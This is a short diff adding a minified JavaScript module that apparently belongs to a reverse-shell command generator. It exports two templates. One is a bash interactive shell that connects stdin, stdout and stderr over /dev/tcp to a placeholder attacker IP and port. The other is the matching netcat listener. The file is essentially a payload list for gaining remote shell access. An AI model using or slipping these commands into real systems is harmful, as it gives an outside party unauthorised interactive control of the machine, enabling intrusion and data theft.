@@ -1,0 +1,1 @@
+const t=[{title:"bash 5 (alternate FD style)",template:"sh -i 5<>/dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",description:"Another file-descriptor based interactive shell that binds stdin/stdout/stderr to FD 5."},{title:"Netcat Listener",template:"nc -lvnp {port}"}],e={commands:t};export{t as commands,e as default};
